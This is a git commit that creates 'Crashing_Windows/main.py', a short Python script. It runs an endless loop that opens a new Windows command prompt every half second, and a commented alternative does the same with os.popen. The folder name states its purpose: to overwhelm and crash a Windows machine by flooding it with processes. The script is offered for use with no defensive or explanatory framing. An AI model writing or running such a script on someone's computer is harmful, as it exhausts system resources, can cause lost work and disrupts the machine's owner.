a5144d96af80516b303e1bbe1ed83ca34875d4e6
Abdul Rehman Kalsekar <78557959+arkalsekar@users.noreply.github.com>
2021-03-01 18:10:03 +0530

    Create main.py

---
+++ Crashing_Windows/main.py
@@ -0,0 +1,11 @@
+import os 
+import time
+
+
+while True:
+  os.system("start cmd")
+  time.sleep(0.5)
+
+# Alternatively If the Above Code Doesn't Open CMD | Try This One .  
+# import os
+# os.popen("Start cmd")
